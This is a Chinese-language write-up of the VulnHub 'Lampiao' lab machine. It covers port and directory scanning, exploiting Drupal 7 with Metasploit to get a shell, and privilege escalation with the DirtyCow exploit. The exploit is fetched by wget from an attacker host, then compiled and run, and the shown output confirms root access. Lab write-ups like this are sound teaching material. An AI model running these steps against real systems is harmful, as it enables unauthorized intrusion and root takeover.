靶机来自 <https://www.vulnhub.com/>

靶机下载：https://download.vulnhub.com/lampiao/Lampiao.zip

## 信息收集

    
    
    root@kali:~# nmap -sS -p-  10.10.10.128
    Starting Nmap 7.80 ( https://nmap.org ) at 2020-06-10 09:21 EDT
    Nmap scan report for 10.10.10.128
    Host is up (0.0014s latency).
    Not shown: 65532 closed ports
    PORT     STATE SERVICE
    22/tcp   open  ssh
    80/tcp   open  http
    1898/tcp open  cymtec-port
    7 (VMware)MAC Address: 00:0C:29:F1:26:4
    Nmap done: 1 IP address (1 host up) scanned in 7.26 seconds
    
    
    root@kali:~# nmap -p 22,80,1898 -A --version-all -T 5 10.10.10.128
    Starting Nmap 7.80 ( https://nmap.org ) at 2020-06-10 09:23 EDT
    Nmap scan report for 10.10.10.128
    Host is up (0.00060s latency).
    
    PORT     STATE SERVICE VERSION
    22/tcp   open  ssh     OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.7 (Ubuntu Linux; protocol 2.0)
    | ssh-hostkey: 
    |   1024 46:b1:99:60:7d:81:69:3c:ae:1f:c7:ff:c3:66:e3:10 (DSA)
    |   2048 f3:e8:88:f2:2d:d0:b2:54:0b:9c:ad:61:33:59:55:93 (RSA)
    |   256 ce:63:2a:f7:53:6e:46:e2:ae:81:e3:ff:b7:16:f4:52 (ECDSA)
    |_  256 c6:55:ca:07:37:65:e3:06:c1:d6:5b:77:dc:23:df:cc (ED25519)
    80/tcp   open  http?
    | fingerprint-strings: 
    |   NULL: 
    |     _____ _ _ 
    |     |_|/ ___ ___ __ _ ___ _ _ 
    |     \x20| __/ (_| __ \x20|_| |_ 
    |     ___/ __| |___/ ___|__,_|___/__, ( ) 
    |     |___/ 
    |     ______ _ _ _ 
    |     ___(_) | | | |
    |     \x20/ _` | / _ / _` | | | |/ _` | |
    |_    __,_|__,_|_| |_|
    1898/tcp open  http    Apache httpd 2.4.7 ((Ubuntu))
    |_http-generator: Drupal 7 (http://drupal.org)
    | http-robots.txt: 36 disallowed entries (15 shown)
    | /includes/ /misc/ /modules/ /profiles/ /scripts/ 
    | /themes/ /CHANGELOG.txt /cron.php /INSTALL.mysql.txt 
    | /INSTALL.pgsql.txt /INSTALL.sqlite.txt /install.php /INSTALL.txt 
    |_/LICENSE.txt /MAINTAINERS.txt
    |_http-server-header: Apache/2.4.7 (Ubuntu)
    |_http-title: Lampi\xC3\xA3o
    1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
    SF-Port80-TCP:V=7.80%I=9%D=6/10%Time=5EE0DEB6%P=x86_64-pc-linux-gnu%r(NULL
    SF:,1179,"\x20_____\x20_\x20\x20\x20_\x20\x20\x20\x20\x20\x20\x20\x20\x20\
    SF:x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20
    SF:\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x2
    SF:0\x20\x20\x20\x20\x20\x20\x20\x20\x20\n\|_\x20\x20\x20_\|\x20\|\x20\(\x
    SF:20\)\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x2
    SF:0\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x
    SF:20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\
    SF:x20\n\x20\x20\|\x20\|\x20\|\x20\|_\|/\x20___\x20\x20\x20\x20___\x20\x20
    SF:__\x20_\x20___\x20_\x20\x20\x20_\x20\x20\x20\x20\x20\x20\x20\x20\x20\x2
    SF:0\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\n
    SF:\x20\x20\|\x20\|\x20\|\x20__\|\x20/\x20__\|\x20\x20/\x20_\x20\\/\x20_`\
    SF:x20/\x20__\|\x20\|\x20\|\x20\|\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\
    SF:x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\n\x20_\
    SF:|\x20\|_\|\x20\|_\x20\x20\\__\x20\\\x20\|\x20\x20__/\x20\(_\|\x20\\__\x
    SF:20\\\x20\|_\|\x20\|_\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x2
    SF:0\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\n\x20\\___/\x20\\__\|
    SF:\x20\|___/\x20\x20\\___\|\\__,_\|___/\\__,\x20\(\x20\)\x20\x20\x20\x20\
    SF:x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20
    SF:\x20\x20\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\
    SF:x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20
    SF:\x20\x20__/\x20\|/\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\
    SF:x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\n\x20\x20\x20\x20\x20\x
    SF:20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\
    SF:x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\|___/\x20\x20\x20\x20\x20\x
    SF:20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\
    SF:x20\x20\x20\x20\n______\x20_\x20\x20\x20\x20\x20\x20\x20_\x20\x20\x20\x
    SF:20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\
    SF:x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20
    SF:\x20\x20\x20\x20\x20\x20\x20\x20\x20_\x20\n\|\x20\x20___\(_\)\x20\x20\x
    SF:20\x20\x20\|\x20\|\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\
    SF:x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20
    SF:\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\|\x20\|\n\
    SF:|\x20\|_\x20\x20\x20_\x20\x20\x20\x20__\|\x20\|_\x20\x20\x20_\x20_\x20_
    SF:_\x20___\x20\x20\x20__\x20_\x20\x20\x20\x20___\x20\x20__\x20_\x20_\x20\
    SF:x20\x20_\x20\x20__\x20_\|\x20\|\n\|\x20\x20_\|\x20\|\x20\|\x20\x20/\x20
    SF:_`\x20\|\x20\|\x20\|\x20\|\x20'_\x20`\x20_\x20\\\x20/\x20_`\x20\|\x20\x
    SF:20/\x20_\x20\\/\x20_`\x20\|\x20\|\x20\|\x20\|/\x20_`\x20\|\x20\|\n\|\x2
    SF:0\|\x20\x20\x20\|\x20\|\x20\|\x20\(_\|\x20\|\x20\|_\|\x20\|\x20\|\x20\|
    SF:\x20\|\x20\|\x20\|\x20\(_\|\x20\|\x20\|\x20\x20__/\x20\(_\|\x20\|\x20\|
    SF:_\|\x20\|\x20\(_\|\x20\|_\|\n\\_\|\x20\x20\x20\|_\|\x20\x20\\__,_\|\\__
    SF:,_\|_\|\x20\|_\|");
    MAC Address: 00:0C:29:F1:26:47 (VMware)
    Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
    Device type: general purpose
    Running: Linux 3.X|4.X
    OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
    OS details: Linux 3.2 - 4.9
    Network Distance: 1 hop
    Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
    
    TRACEROUTE
    HOP RTT     ADDRESS
    1   0.60 ms 10.10.10.128
    
    OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
    Nmap done: 1 IP address (1 host up) scanned in 30.20 seconds80端口其实没有啥东西，扫目录啥都扫不到，只有个静态页面。主要的web服务在1898端口。  
    扫描1898端口：

80端口其实没有啥东西，扫目录啥都扫不到，只有个静态页面。主要的web服务在1898端口。

扫描1898端口：

    
    
    root@kali:~# dirb http://10.10.10.128:1898
    
    -----------------    DIRB v2.22    
    By The Dark Raver
    -----------------    
    START_TIME: Wed Jun 10 09:25:07 2020
    URL_BASE: http://10.10.10.128:1898/
    WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt
    
    -----------------    
    GENERATED WORDS: 4612                                                          
    
    ---- Scanning URL: http://10.10.10.128:1898/ ----    ==> DIRECTORY: http://10.10.10.128:1898/includes/                                                                                                                        
    + http://10.10.10.128:1898/index.php (CODE:200|SIZE:11400)                                                                                                               
    ==> DIRECTORY: http://10.10.10.128:1898/misc/                                                                                                                            
    ==> DIRECTORY: http://10.10.10.128:1898/modules/                                                                                                                         
    ==> DIRECTORY: http://10.10.10.128:1898/profiles/                                                                                                                        
    + http://10.10.10.128:1898/robots.txt (CODE:200|SIZE:2189)                                                                                                               
    ==> DIRECTORY: http://10.10.10.128:1898/scripts/                                                                                                                         
    + http://10.10.10.128:1898/server-status (CODE:403|SIZE:294)                                                                                                             
    ==> DIRECTORY: http://10.10.10.128:1898/sites/                                                                                                                           
    ==> DIRECTORY: http://10.10.10.128:1898/themes/                                                                                                                          
    + http://10.10.10.128:1898/web.config (CODE:200|SIZE:2200)                                                                                                               
    + http://10.10.10.128:1898/xmlrpc.php (CODE:200|SIZE:42)                                                                                                                 
                                                                                                                                                                             
    ---- Entering directory: http://10.10.10.128:1898/includes/ ----    (!) WARNING: Directory IS LISTABLE. No need to scan it.                        
        (Use mode '-w' if you want to scan it anyway)
                                                                                                                                                                             
    ---- Entering directory: http://10.10.10.128:1898/misc/ ----    (!) WARNING: Directory IS LISTABLE. No need to scan it.                        
        (Use mode '-w' if you want to scan it anyway)
                                                                                                                                                                             
    ---- Entering directory: http://10.10.10.128:1898/modules/ ----    (!) WARNING: Directory IS LISTABLE. No need to scan it.                        
        (Use mode '-w' if you want to scan it anyway)
                                                                                                                                                                             
    ---- Entering directory: http://10.10.10.128:1898/profiles/ ----    (!) WARNING: Directory IS LISTABLE. No need to scan it.                        
        (Use mode '-w' if you want to scan it anyway)
                                                                                                                                                                             
    ---- Entering directory: http://10.10.10.128:1898/scripts/ ----    (!) WARNING: Directory IS LISTABLE. No need to scan it.                        
        (Use mode '-w' if you want to scan it anyway)
                                                                                                                                                                             
    ---- Entering directory: http://10.10.10.128:1898/sites/ ----    (!) WARNING: Directory IS LISTABLE. No need to scan it.                        
        (Use mode '-w' if you want to scan it anyway)
                                                                                                                                                                             
    ---- Entering directory: http://10.10.10.128:1898/themes/ ----    (!) WARNING: Directory IS LISTABLE. No need to scan it.                        
        (Use mode '-w' if you want to scan it anyway)
                                                                                   
    -----------------    END_TIME: Wed Jun 10 09:25:12 2020
    DOWNLOADED: 4612 - FOUND: 5

可以挨个打开看看，然后找到这样一个minimal.info文件在<http://10.10.10.128:1898/profiles/>，这里面包含了webCMS的版本信息。

![image.png](https://image.3001.net/images/20200820/1597911076.png!small)

我们可以搜索一下有没有对应的漏洞

searchsploit Drupal

![image.png](https://image.3001.net/images/20200701/1593550745.png!small)

漏洞还挺多，我们可以进MSF中尝试利用，MSF中可以找![image.png](https://image.3001.net/images/20200701/1593550745.png!small)到不少利用模块，图中标注的可以直接getshell

配置参数如下：

![image.png](https://image.3001.net/images/20200701/1593550745.png!small)

此时我们拿到了www-data的权限。下一步就是需要提权。

## 提权

我们首先将拿到的shell提升成全交互式的shell，提升shell的方法有很多，这里有个国外大佬的link，可以参考下

<https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/>

我这里用的是这条命令：

python -c 'import pty; pty.spawn("/bin/bash")'

提升完成之后更方便我们操作，这里提供一个Linux 提权脚本，这个脚本可以自动检测可以用于当前环境的提权漏洞

<https://github.com/mzet-/linux-exploit-suggester>

最后找到了这个提权漏洞

<https://www.exploit-db.com/exploits/40847>

首先将漏洞代码下载到目标靶机：

    
    
    wget http://10.10.10.131/40847.cpp            
    --2020-06-10 14:44:02--  http://10.10.10.131/40847.cpp
    Connecting to 10.10.10.131:80... connected.
    HTTP request sent, awaiting response... 200 OK
    Length: 10531 (10K) [text/x-c++src]
    Saving to: '40847.cpp'
    
         0K ..........                                            100% 74.9M=0s
    
    2020-06-10 14:44:02 (74.9 MB/s) - '40847.cpp' saved [10531/10531]

然后编译提权

    
    
    g++ -Wall -pedantic -O2 -std=c++11 -pthread -o dcow 40847.cpp -lutil
    ls
    40847.cpp
    40871.c
    44298.c
    dcow
    exp
    expoit
    les.sh
    ./dcow -s 
    Running ...
    Password overridden to: dirtyCowFun
    
    Received su prompt (Password: )
    Error getting terminal attributes.
    terminate called after throwing an instance of 'std::exception*'
    Aborted (core dumped)
    id
    uid=33(www-data) gid=33(www-data) groups=33(www-data)
    python -c 'import pty; pty.spawn("/bin/bash")'
    www-data@lampiao:/tmp$ ls
    ls
    40847.cpp  40871.c  44298.c  dcow  exp  expoit  les.sh
    www-data@lampiao:/tmp$ ./dcow -s
    ./dcow -s
    Running ...
    Password overridden to: dirtyCowFun
    
    Received su prompt (Password: )
    
    echo 0 > /proc/sys/vm/dirty_writeback_centisecs
    cp /tmp/.ssh_bak /etc/passwd
    rm /tmp/.ssh_bak
    root@lampiao:~# echo 0 > /proc/sys/vm/dirty_writeback_centisecs
    root@lampiao:~# cp /tmp/.ssh_bak /etc/passwd
    root@lampiao:~# rm /tmp/.ssh_bak
    root@lampiao:~# id
    id
    uid=0(root) gid=0(root) groups=0(root)

在每个提权脚本的前几行都会有怎么编译，需要关注哪些内容，可以多看看脚本的前几行，一般用注释会有写出来。

拿到root权限之后，我们可以找到最后的flag.txt

    
    
    root@lampiao:~# cat flag.txt
    cat flag.txt
    9740616875908d91ddcdaa8aea3af366

